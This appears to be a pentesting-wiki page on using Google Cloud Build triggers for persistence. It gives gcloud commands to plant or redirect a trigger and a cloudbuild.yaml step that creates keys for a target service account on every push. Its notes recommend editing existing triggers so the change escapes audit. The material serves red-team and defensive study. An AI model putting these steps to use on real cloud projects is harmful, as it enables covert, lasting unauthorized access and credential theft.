---
title: "Build triggers: repository triggers that run as the build service account"
description: "Planting or editing Cloud Build triggers tied to a repository so pushes run attacker build steps as the build service account."
keywords:
  - build triggers
  - Cloud Build
  - repository
  - push trigger
  - persistence
---

# Build triggers

A Cloud Build **trigger** starts a build when a repository event fires (a push, a tag, a pull request). Planting or editing a trigger, or committing a `cloudbuild.yaml` the trigger already runs, turns ordinary repository activity into recurring execution as the Cloud Build service account, which makes it durable persistence rather than a one-shot build.

## Planting a trigger

```bash
gcloud builds triggers create github \
  --repo-name <repo> --repo-owner <org> --branch-pattern '^main$' \
  --build-config cloudbuild.yaml
# or point an existing trigger at an attacker-controlled config
gcloud builds triggers list
gcloud builds triggers describe <trigger>
```

## Persistence through the config

```yaml
# a cloudbuild.yaml committed to the watched repo re-establishes access on every push
steps:
  - name: gcr.io/cloud-builders/gcloud
    args: ['iam','service-accounts','keys','create','k.json','--iam-account','<target-sa>']
```

## Exploitation notes

- The trigger runs as the Cloud Build SA (often Editor), so its steps can mint keys, add IAM bindings, or deploy resources without further escalation.
- A trigger is quieter than repeated manual builds: it blends into normal CI and keeps firing after your interactive access is gone.
- Editing an existing trigger's config source or substitutions is stealthier than creating a new trigger that stands out in an audit.

## Tools

- **gcloud** (`builds triggers create/update/describe/list`).

## References

- [HackTricks Cloud: GCP Cloud Build persistence](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Rhino Security Labs: GCP privilege escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Google: Cloud Build triggers](https://cloud.google.com/build/docs/automating-builds/create-manage-triggers)
